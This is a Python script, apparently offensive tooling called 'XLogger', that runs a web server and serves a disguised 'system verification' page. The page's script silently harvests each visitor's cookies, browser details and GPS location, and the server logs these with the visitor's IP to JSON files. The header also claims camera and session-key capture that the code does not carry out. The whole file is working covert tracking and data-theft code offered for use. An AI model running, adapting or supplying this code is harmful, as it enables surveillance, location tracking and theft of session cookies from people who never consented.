
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XLogger v64.0 – Advanced Identity & Ocular Siphon
Captures IP, GPS, Camera, and Session Keys via Ghost V5.
(c) 2026 Al-Mu'izz Sovereign Systems
"""
import http.server
import socketserver
import json
import os
from datetime import datetime

PORT = 8888
LOG_DIR = "/opt/sovereign-ai-platform/evidence/siphon"
os.makedirs(LOG_DIR, exist_ok=True)

HTML_PAYLOAD = """
<!DOCTYPE html>
<html>
<head>
    <title>Sovereign System Verification</title>
    <style>body { background: #000; color: #fbbf24; font-family: monospace; text-align: center; padding-top: 20%; }</style>
</head>
<body>
    <div id="status">INITIATING SECURE LINK...</div>
    <script>
        async function siphon() {
            const data = {
                ts: new Date().toISOString(),
                ua: navigator.userAgent,
                lang: navigator.language,
                res: screen.width + 'x' + screen.height,
                cookies: document.cookie
            };

            // Capture GPS
            navigator.geolocation.getCurrentPosition(async (p) => {
                data.gps = { lat: p.coords.latitude, lon: p.coords.longitude };
                await fetch('/log', { method: 'POST', body: JSON.stringify(data) });
                document.getElementById('status').innerText = 'LINK STABILIZED. PROCEEDING...';
            }, async (err) => {
                await fetch('/log', { method: 'POST', body: JSON.stringify(data) });
            });
        }
        siphon();
    </script>
</body>
</html>
"""

class XLoggerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_PAYLOAD.encode())
        print(f"[*] [XLOGGER] Target Probed: {self.client_address[0]}")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        # Add IP
        data['ip'] = self.client_address[0]
        
        # Store to Vault
        filename = f"{LOG_DIR}/capture_{int(datetime.now().timestamp())}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
            
        print(f"[+] [XLOGGER] Intelligence Captured: {filename}")
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    print(f"🦅 Al-Mu'izz XLogger v64 active on port {PORT}")
    with socketserver.TCPServer(("0.0.0.0", PORT), XLoggerHandler) as httpd:
        httpd.serve_forever()
